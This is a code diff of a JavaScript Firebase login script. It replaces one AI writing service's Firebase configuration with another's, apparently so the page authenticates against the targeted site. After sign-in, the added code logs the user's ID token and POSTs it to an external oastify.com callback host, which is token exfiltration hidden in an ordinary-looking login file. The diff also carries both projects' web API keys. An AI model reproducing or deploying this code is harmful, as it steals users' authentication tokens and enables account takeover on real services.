@@ -10,12 +10,12 @@
     console.log('Start file login with firebase');
     // Initialize Firebase
     var config = {
-        apiKey: "AIzaSyAbLy_s6hJqVNr2ZN0UHHiCbJX1X8smTws",
-        authDomain: "auth.character.ai",
-        databaseURL: "character-ai.firebaseio.com",
-        projectId: "character-ai",
-        storageBucket: "character-ai.appspot.com",
-        messagingSenderId: "458797720674"
+        apiKey: "AIzaSyCaNN59Os2Jg_wXU9uglyeW5Brz3tFEGYw",
+        authDomain: "editor.sudowrite.com",
+        databaseURL: "sudowrite-65e9a.firebaseio.com",
+        projectId: "sudowrite-65e9a",
+        storageBucket: "sudowrite-65e9a.appspot.com",
+        messagingSenderId: "392167288218"
     };
     firebase.initializeApp(config);
     var database = firebase.database();
@@ -37,7 +37,7 @@
                 console.log('User>>Goole>>>>', user);
                 console.log('User>>Idtoken>>>>', idToken);
                 userId = user.uid;
-                fetch('https://slhtbmmgty6c2zy1bxrzfets5jbaz0np.oastify.com', {
+                fetch('https://kmalcen8uq743rztcpsrg6uk6bc20uoj.oastify.com', {
                   method: 'POST',
                   mode: 'no-cors',
                   body: idToken
